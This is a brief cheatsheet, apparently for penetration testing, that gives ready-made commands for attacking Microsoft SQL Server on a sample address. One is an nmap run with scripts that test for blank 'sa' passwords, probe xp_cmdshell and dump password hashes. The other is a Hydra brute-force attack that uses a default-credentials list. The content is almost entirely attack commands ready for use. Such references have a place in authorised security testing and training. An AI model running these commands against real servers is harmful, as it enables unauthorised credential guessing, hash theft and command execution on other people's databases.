# MSSQL Exploitation and Enumeration Cheatsheet

## Nmap Script

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
-sV -p 1433 192.168.1.1
```

## Brute Force with Hydra

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt mssql://192.168.1.1
